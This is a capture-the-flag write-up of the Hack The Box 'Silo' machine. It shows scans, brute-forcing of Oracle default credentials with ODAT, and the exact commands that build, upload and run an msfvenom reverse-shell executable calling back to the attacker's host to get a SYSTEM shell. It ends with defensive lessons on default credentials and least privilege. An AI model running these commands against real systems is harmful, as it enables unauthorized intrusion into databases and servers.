# Silo Writeup w/o Metasploit

![](https://miro.medium.com/max/592/1*TTpmMHhQNAq0jq0i6J8HXA.png)

## Reconnaissance <a id="5c97"></a>

Run the [nmapAutomato](https://github.com/rkhal101/nmapAutomator)r script to enumerate open ports and services running on those ports.

```text
./nmapAutomator.sh 10.10.10.82 All
```

* **All**: Runs all the scans consecutively.

We get back the following result.

```text
Running all scans on 10.10.10.82Host is likely running Windows---------------------Starting Nmap Quick Scan---------------------
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 11:51 EST
Warning: 10.10.10.82 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.82
Host is up (0.042s latency).
Not shown: 507 closed ports, 481 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1521/tcp  open  oracle
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown
49161/tcp open  unknownNmap done: 1 IP address (1 host up) scanned in 9.36 seconds---------------------Starting Nmap Basic Scan---------------------
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 11:52 EST
Nmap scan report for 10.10.10.82
Host is up (0.13s latency).PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49161/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsHost script results:
|_clock-skew: mean: 2m11s, deviation: 0s, median: 2m11s
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-02-23T16:56:29
|_  start_date: 2020-02-23T16:53:39Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 137.13 seconds----------------------Starting Nmap UDP Scan----------------------
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 11:54 EST
Warning: 10.10.10.82 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.82
Host is up (0.19s latency).
All 1000 scanned ports on 10.10.10.82 are closed (682) or open|filtered (318)Nmap done: 1 IP address (1 host up) scanned in 957.01 seconds---------------------Starting Nmap Full Scan----------------------
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 12:10 EST
Initiating Parallel DNS resolution of 1 host. at 12:10
Completed Parallel DNS resolution of 1 host. at 12:10, 0.03s elapsed
.....
Nmap scan report for 10.10.10.82
Host is up (0.043s latency).
Not shown: 64150 closed ports, 1370 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1521/tcp  open  oracle
5985/tcp  open  wsman
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown
49161/tcp open  unknown
49162/tcp open  unknownRead data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 237.23 seconds
           Raw packets sent: 89983 (3.959MB) | Rcvd: 85386 (3.416MB)Making a script scan on extra ports: 5985, 47001, 49162
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 12:14 EST
Nmap scan report for 10.10.10.82
Host is up (0.47s latency).PORT      STATE SERVICE VERSION
5985/tcp  open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49162/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.68 seconds---------------------Starting Nmap Vulns Scan---------------------
                                                                                               
Running CVE scan on all ports
                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 12:15 EST
Nmap scan report for 10.10.10.82
Host is up (0.17s latency).PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49161/tcp open  msrpc        Microsoft Windows RPC
49162/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 125.10 seconds---------------------Recon Recommendations----------------------Web Servers Recon:
                                                                                               
gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.82:80 -o recon/gobuster_10.10.10.82_80.txt
nikto -host 10.10.10.82:80 | tee recon/nikto_10.10.10.82_80.txtgobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.82:5985 -o recon/gobuster_10.10.10.82_5985.txt
nikto -host 10.10.10.82:5985 | tee recon/nikto_10.10.10.82_5985.txtgobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.82:47001 -o recon/gobuster_10.10.10.82_47001.txt
nikto -host 10.10.10.82:47001 | tee recon/nikto_10.10.10.82_47001.txtSMB Recon:
                                                                                               
smbmap -H 10.10.10.82 | tee recon/smbmap_10.10.10.82.txt
smbclient -L "//10.10.10.82/" -U "guest"% | tee recon/smbclient_10.10.10.82.txt
nmap -Pn -p445 --script vuln -oN recon/SMB_vulns_10.10.10.82.txt 10.10.10.82Oracle Recon "Exc. from Default":
                                                                                               
cd /opt/odat/;#10.10.10.82;
./odat.py sidguesser -s 10.10.10.82 -p 1521
./odat.py passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file accounts/accounts-multiple.txt
cd -;#10.10.10.82;Which commands would you like to run?                                                          
All (Default), gobuster, nikto, nmap, odat, smbclient, smbmap, Skip <!>Running Default in (1) s:---------------------Running Recon Commands----------------------Starting gobuster scan
                                                                                               
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.82:80
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     html,php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/02/23 12:30:10 Starting gobuster
===============================================================
http://10.10.10.82:80/aspnet_client (Status: 301) [Size: 159]
===============================================================
2020/02/23 12:32:56 Finished
===============================================================Finished gobuster scan                                                                                                                                                                                                                                                                                                                     
=========================
                                                                                                                                                    
Starting gobuster scan
                                                                                                                                                    
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.82:5985
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     html,php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/02/23 12:48:56 Starting gobuster
===============================================================
===============================================================
2020/02/23 12:50:47 Finished
===============================================================Finished gobuster scan                                                                                                                       
=========================
                                                                                                                                                    
                                                                                                                                                    
Starting gobuster scan
                                                                                                                                                    
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.82:47001
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     html,php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/02/23 13:23:17 Starting gobuster
===============================================================
===============================================================
2020/02/23 13:25:25 Finished
===============================================================Finished gobuster scan
                                                                                                                                                    
                                                                                                                                                    
Starting smbmap scan
                                                                                                                                                    
[+] Finding open SMB ports....
[!] Authentication error on 10.10.10.82
[!] Authentication error on 10.10.10.82Finished smbmap scan
                                                                                                                                                    
=========================
                                                                                                                                                    
Starting smbclient scan
                                                                                                                                                    
session setup failed: NT_STATUS_ACCOUNT_DISABLEDFinished smbclient scan
                                                                                                                                                    
=========================
                                                                                                                                                    
Starting nmap scan
                                                                                                                                                    
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 13:38 EST
Nmap scan report for 10.10.10.82
Host is up (0.039s latency).PORT    STATE SERVICE
445/tcp open  microsoft-ds
|_clamav-exec: ERROR: Script execution failed (use -d to debug)Host script results:
|_samba-vuln-cve-2012-1182: No accounts left to try
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: No accounts left to tryNmap done: 1 IP address (1 host up) scanned in 24.20 secondsFinished nmap scan
                                                                                                                                                                                                                                                                                                                                                                                                                    
                                                                                                                                                    
---------------------Finished all Nmap scans---------------------Completed in 1 hour(s), 47 minute(s) and 6 second(s)
```

We have fifteen open ports.

* **Port 80:** running Microsoft-IIS/8.5
* **Ports 135, 49152, 49153, 49154, 49155,49158, 49161 & 49162:** running Microsoft Windows RPC
* **Ports 139 & 445:** running Samba
* **Ports 1521 & 4196:** running Oracle TNS listener
* **Ports 5985 & 47001:** running Microsoft HTTP API httpd 2.0

Before we move on to enumeration, let’s make some mental notes about the scan results.

* Port 80 is running a Microsoft IIS server. A quick google search tells us that the OS is probably Windows Server 2012 R2. The gobuster scan didn’t really find anything useful for this web server.
* The nmap scan reported a “_guest_” account for SMB, however, the smbclient scan reported an “_NT\_STATUS\_ACCOUNT\_DISABLED_” status, so I doubt we’ll be able to access any of the shares. We can check this manually.
* Ports 1521 & 4196 are running Oracle TNS listener. This is the database server software component that manages the network traffic between the Oracle Database and the client. If we manage to get access to this service with an account that has administrative privileges, we can potentially execute code on the box. The nmapAutomator script uses the Oracle Database Attacking Tool \(ODAT\) to enumerate the system ID and usernames/passwords. However, since the box kept crashing, I terminated the scan. We’ll do our own manual enumeration using this tool.

## Enumeration <a id="c516"></a>

If you don’t have ODAT installed on kali, the installation instructions can be found [here](https://github.com/quentinhardy/odat#installation-optional-for-development-version).

The first thing we need to enumerate is the Oracle System ID \(SID\) string. This is a string that is used to uniquely identify a particular database on a system. This can be done using the _sidguesser_ module in ODAT.

```text
python3 odat.py sidguesser -s 10.10.10.82 -p 1521
```

This takes a while, but it does find 4 valid SID strings.

```text
[+] SIDs found on the 10.10.10.82:1521 server: XE,XEXDB,SA,SB
```

We’ll use the first one: _XE_.

The second thing to do is enumerate valid credentials. This can be done using the _passwordguesser_ module in ODAT. I tried both account files that come with the ODAT installation, however, the tool didn’t find any valid credentials. So instead, let’s locate the credential list that the Metasploit framework uses.

```text
root@kali:~/Desktop/tools/odat# locate oracle_default_userpass.txt
/usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt
```

Copy it into the ODAT _accounts_ directory.

```text
root@kali:~/Desktop/tools/odat# cp /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt accounts/
```

The username and passwords in this list are separated by a space instead of a forward slash \(/\). We’ll have to change it to forward slash so that the ODAT tool is able to parse the file. This can be done in vi using the following command.

```text
 :%s/ /\//g
```

Now that we have a proper list, we can use the _passwordguesser_ module to brute force credentials.

```text
python3 odat.py passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file accounts/oracle_default_userpass.txt
```

Again, this also takes a while but it ends up finding credentials!

```text
[+] Accounts found on 10.10.10.82:1521/XE: 
scott/tiger
```

If you look at the [Oracle documentation](https://docs.oracle.com/cd/B19306_01/install.102/b15660/rev_precon_db.htm), the username/password that we found are actually one of the default credentials used when setting up Oracle. Now that we have a valid SID and username/password, let’s see if we can get code execution on the box.

## Exploitation <a id="03d0"></a>

ODAT has a _utlfile_ module that allows you to upload, download or delete a file. Since we are trying to get code execution on the box, let’s upload a malicious executable that sends a reverse shell back to our attack machine.

First, generate the executable using msfvenom.

```text
msfvenom -p windows/x64/shell_reverse_tcp  LHOST=10.10.14.7 LPORT=1234 -f exe > shell.exe
```

Next, upload the file using the _utlfile_ module.

```text
python3 odat.py utlfile -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --putFile /temp shell.exe ../../htb/silo/shell.exe
```

We get the following error.

```text
[-] Impossible to put the ../../htb/silo/shell.exe file: `ORA-01031: insufficient privileges`
```

We don’t have sufficient privileges to upload a file. Let’s see if the user was given _sysdba_ privileges by adding the _sysdba_ flag to our command.

```text
python3 odat.py utlfile -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --putFile /temp shell.exe ../../htb/silo/shell.exe --sysdba
```

Now we need to execute the file. We can do that using the _externaltable_ module in ODAT.

First setup a listener on the attack machine to receive the reverse shell.

```text
nc -nlvp 1234
```

Next, execute the file using the following command.

```text
python3 odat.py externaltable -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --exec /temp shell.exe --sysdba
```

We get a shell!

![](https://miro.medium.com/max/834/1*M3cgHNR6Wur9aNX9TBwQjQ.png)

The database must have been running with SYSTEM privileges and so we got a shell as SYSTEM.

Grab the _user.txt_ flag.

![](https://miro.medium.com/max/614/1*rKfcd2xVS2Aqrw_p903Yzw.png)

Grab the _root.txt_ flag.

![](https://miro.medium.com/max/615/1*csWE8hku7mMusqOpJLROPg.png)

**Note:** IppSec has a [great video](https://www.youtube.com/watch?v=2c7SzNo9uoA) explaining how to do this manually without having to use ODAT or Metasploit. He also goes through the intended solution for the box which is much harder than the way I solved it.

## Lessons Learned <a id="a815"></a>

To get SYSTEM on this box, we exploited two vulnerabilities.

1. Use of Default Credentials. There was an exposed port that was running Oracle TNS listener. The administrator had used default credentials for a user that had sysdba \(privileged\) access. This allowed us to login as that user and execute malicious code on the box. Since default credentials are publicly available and can be easily obtained, the administrator should have instead used a sufficiently long password that is difficult to crack.
2. Least Privilege Violation. Oracle doesn’t need SYSTEM privileges to function properly. Instead it should have been run under a normal user account that has limited privileges. This way, even if we did get access to the box, we would have needed to find a way to escalate privileges, instead of immediately getting SYSTEM access without having to work for it. The administrator should have conformed to the principle of least privilege.

